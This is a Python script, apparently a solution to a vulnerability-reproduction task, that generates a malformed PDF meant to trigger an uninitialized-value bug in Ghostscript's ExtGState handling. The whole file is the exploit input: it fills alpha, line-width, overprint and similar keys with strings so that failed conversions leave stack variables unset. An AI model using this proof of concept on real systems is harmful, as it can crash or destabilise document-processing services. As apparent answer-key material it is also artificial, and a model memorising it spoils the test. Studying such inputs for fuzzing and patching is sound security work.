import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Uninitialized Value vulnerability in Ghostscript.
        The vulnerability occurs when attribute conversions in ExtGState fail (e.g. type mismatch),
        but the error code is ignored, leading to the usage of uninitialized stack variables.
        """
        
        objects = []
        
        # 1. Catalog
        objects.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        
        # 2. Pages
        objects.append(b"2 0 obj\n<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>\nendobj\n")
        
        # 3. Page
        objects.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 612 792 ] /Contents 4 0 R /Resources 5 0 R >>\nendobj\n")
        
        # 4. Content Stream
        # Invokes the graphics state /GS1 defined in resources
        stream_content = b"q /GS1 gs Q"
        objects.append(b"4 0 obj\n<< /Length " + str(len(stream_content)).encode() + b" >>\nstream\n" + stream_content + b"\nendstream\nendobj\n")
        
        # 5. Resources
        objects.append(b"5 0 obj\n<< /ExtGState << /GS1 6 0 R >> >>\nendobj\n")
        
        # 6. ExtGState (The Malformed Object)
        # We provide String objects (enclosed in ()) for keys that expect Numbers or Booleans.
        # This forces the internal conversion functions (e.g. pdfi_dict_get_number) to return an error.
        # The vulnerable code fails to check this error and uses uninitialized variables.
        ext_gstate = (
            b"6 0 obj\n"
            b"<< /Type /ExtGState "
            b"/ca (inv) "   # Expects float (non-stroking alpha)
            b"/CA (inv) "   # Expects float (stroking alpha)
            b"/LW (inv) "   # Expects float (line width)
            b"/LC (inv) "   # Expects int (line cap)
            b"/LJ (inv) "   # Expects int (line join)
            b"/ML (inv) "   # Expects float (miter limit)
            b"/OP (inv) "   # Expects bool (overprint)
            b"/op (inv) "   # Expects bool (overprint)
            b"/OPM (inv) "  # Expects int (overprint mode)
            b"/AIS (inv) "  # Expects bool (alpha source)
            b"/TK (inv) "   # Expects bool (text knockout)
            b">>\n"
            b"endobj\n"
        )
        objects.append(ext_gstate)
        
        # Construct PDF binary
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        pdf_data = bytearray(header)
        
        # Track offsets for Cross-Reference Table
        obj_offsets = {}
        
        for i, obj_bytes in enumerate(objects):
            obj_id = i + 1
            obj_offsets[obj_id] = len(pdf_data)
            pdf_data.extend(obj_bytes)
            
        # Build XRef Table
        xref_start = len(pdf_data)
        pdf_data.extend(b"xref\n")
        pdf_data.extend(f"0 {len(objects) + 1}\n".encode())
        pdf_data.extend(b"0000000000 65535 f \n")
        
        for i in range(1, len(objects) + 1):
            offset = obj_offsets[i]
            # PDF requires 10-digit offsets
            pdf_data.extend(f"{offset:010d} 00000 n \n".encode())
            
        # Trailer
        pdf_data.extend(b"trailer\n")
        pdf_data.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode())
        pdf_data.extend(b"startxref\n")
        pdf_data.extend(f"{xref_start}\n".encode())
        pdf_data.extend(b"%%EOF\n")
        
        return bytes(pdf_data)